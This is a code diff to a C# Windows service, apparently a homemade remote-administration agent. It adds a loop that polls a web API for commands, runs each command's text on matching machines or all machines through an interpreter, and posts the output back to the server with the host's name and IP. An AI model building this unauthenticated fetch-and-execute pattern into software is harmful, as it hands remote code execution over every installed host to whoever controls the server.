@@ -8,6 +8,7 @@ using System.Diagnostics;
 using System.Globalization;
 using System.IO;
 using System.Linq;
+using System.Net;
 using System.Net.Http;
 using System.Net.Http.Headers;
 using System.Net.Sockets;
@@ -23,8 +24,8 @@ namespace grace_soul
     public partial class Service1 : ServiceBase
     {
         private System.Timers.Timer _timer_scheduler, /*_timer_trigger,*/ _timer_runTotal;
-        schedule sch_to_run = null;
-        private static ulong elapsedMinutes = 0;        
+        private schedule sch_to_run = null;
+        private static ulong elapsedMinutes = 0;
 
         public Service1()
         {
@@ -45,6 +46,14 @@ namespace grace_soul
             public string id { get; set; }
             public string text { get; set; }
             public string forWhom { get; set; }
+        }
+        #endregion
+        #region Log Classes
+        public class Log
+        {            
+            public string text { get; set; }
+            public string from { get; set; }
+            public string dateTime { get; set; }
         }
         #endregion
 
@@ -134,6 +143,60 @@ namespace grace_soul
             #endregion
         }
 
+        private void SaveLogToTheServer(string s_fromAddress, string s_log)
+        {            
+            Log httpLog = new Log();
+            httpLog.from = s_fromAddress;
+            httpLog.text = s_log;
+
+            string json = new JavaScriptSerializer().Serialize(httpLog);
+            var httpContent = new StringContent(json, Encoding.UTF8, "application/json");
+
+            string JSON_response = cls_Network.Http_POST("api/logs/", httpContent).Result;
+            if (JSON_response != null)
+                cls_Utility.Log("\r\n" + "Http Log saved successfully.");
+        }
+
+        private void DeleteHTTPCommand(Command command)
+        {
+            #region Deleting the just fetched commands
+            string JSON_response = cls_Network.Http_DELETE("api/commands/" + command.id).Result;
+            if (JSON_response != null)
+                cls_Utility.Log("\r\n" + "Fetched Http command [" + command.id + "] deleted successfully.");
+            #endregion
+        }
+
+        private string RunHTTPCommand(Command command)
+        {
+            #region Running fetched command(s)
+            cls_Utility.Log("\r\n" + "Http command(s) [" + command.id + "] running: ");
+            object result = cls_Interpreter.RunACommand(command.text, null);
+            if (result != null)
+            {
+                cls_Utility.Log("\r\n" + result);
+            }
+
+            return result.ToString();
+            //string[] lines = command.text.Split(new char[] { ';' });
+            //foreach(string line in lines)
+            //{
+            //    object result = cls_Interpreter.RunACommand(line, null);
+            //    if (result != null)
+            //    {
+
+            //        cls_Utility.Log("\r\n" + result);
+            //    }
+            //}            
+            #endregion
+        }
+
+        private void AddCommandToHistory(Command command)
+        {
+            #region Adding command(s) to History
+            cls_Utility.Log("\r\n" + "Deleted Http command(s) [" + command.id + "] added to history successfully.");
+            #endregion
+        }
+
         private void _timer_scheduler_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
         {
             #region Resetting log file
@@ -147,50 +210,78 @@ namespace grace_soul
             catch {}
             #endregion
 
-            #region Connecting to and running GET from API "grace.khaledr.ir/api/commands"
-            string JSON_data = cls_Network.http_GET("api/commands");
-
-            if (JSON_data != null)
+            try
             {
-                cls_Utility.Log("\r\n" + "Http GET successfully.");
+                #region Connecting to and running GET from API "grace.khaledr.ir/api/commands"
+                string JSON_data = cls_Network.Http_GET("api/commands").Result;
 
-                Commands commands = new JavaScriptSerializer().Deserialize<Commands>(JSON_data);
+                if (JSON_data != null)
+                {                    
+                    Commands commands = new JavaScriptSerializer().Deserialize<Commands>(JSON_data);                    
 
-                cls_Utility.Log("\r\n" + "JSON deserialized successfully.");
-
-                if (commands != null)
-                {
-                    foreach (Command command in commands.commands)
+                    if (commands != null)
                     {
-                        #region Deleting the just fetched commands
-                        string JSON_response = cls_Network.http_DELETE("api/commands/" + command.id);
-                        if (JSON_response != null)
-                            cls_Utility.Log("\r\n" + "Fetched command [" + command.id + "] deleted successfully.");
-                        #endregion
-
-                        if (cls_Network.ValidateIPv4(command.forWhom))
+                        foreach (Command command in commands.commands)
                         {
-                            string localhostname = 
+                            string localhostAddress = "";                            
+                            if (command.forWhom != "{@all@}") //if forWhom is an IP
+                            {                                
+                                if (cls_Network.ValidateIPv4(command.forWhom))
+                                {
+                                    IPAddress ip = cls_Network.cls_IPTools.GetLocalActiveIP(cls_Network.pingableIPAddress, cls_Network.PORT);
+                                    localhostAddress = ip.ToString();
+                                }
+                                else
+                                {
+                                    localhostAddress = cls_System.GetLocalComputerName();
+                                }
+
+                                // Run the command only if it is for you
+                                if (localhostAddress == command.forWhom)
+                                {
+                                    DeleteHTTPCommand(command);
+                                    AddCommandToHistory(command);
+
+                                    string s_fromAddress = cls_System.GetLocalComputerName();
+                                    try
+                                    {
+                                        s_fromAddress += " | " + cls_Network.cls_IPTools.GetLocalActiveIP(cls_Network.pingableIPAddress, cls_Network.PORT).ToString();
+                                    }
+                                    catch { }
+
+                                    SaveLogToTheServer(s_fromAddress, RunHTTPCommand(command));
+                                }
+                                else { /*if the command is not for this workstation nothing happens*/ }
+
+                            }
+                            else // if forWhom == {@all@}
+                            {
+                                DeleteHTTPCommand(command);
+                                AddCommandToHistory(command);
+
+                                string s_fromAddress = cls_System.GetLocalComputerName();
+                                try
+                                {
+                                    s_fromAddress += " | " + cls_Network.cls_IPTools.GetLocalActiveIP(cls_Network.pingableIPAddress, cls_Network.PORT).ToString();
+                                }
+                                catch { }
+
+                                SaveLogToTheServer(s_fromAddress, RunHTTPCommand(command));
+                            }
                         }
 
-                        #region Running fetched command(s)
-                        //object result = cls_Interpreter.RunACommand(command.text, null);
-                        //if (result != null)
-                        //    cls_Utility.Log("\r\n" + result);
-                        #endregion
-
-                        #region Adding deleted command(s) to History
-                        cls_Utility.Log("\r\n" + "Deleted command [" + command.id + "] added to history successfully.");
-                        #endregion
                     }
-
                 }
-            }
-            else
+                else
+                {
+                    //cls_Utility.Log("\r\n" + "TIK: No Https command found.");
+                }
+                #endregion
+
+            }catch(Exception ex)
             {
-                //cls_Utility.Log("\r\n" + "TIK: no Https command found.");
+                //cls_Utility.Log("! Error - Service1. Connecting to HTTP server faild. " + ex.Message);
             }
-            #endregion
 
             elapsedMinutes++;
 
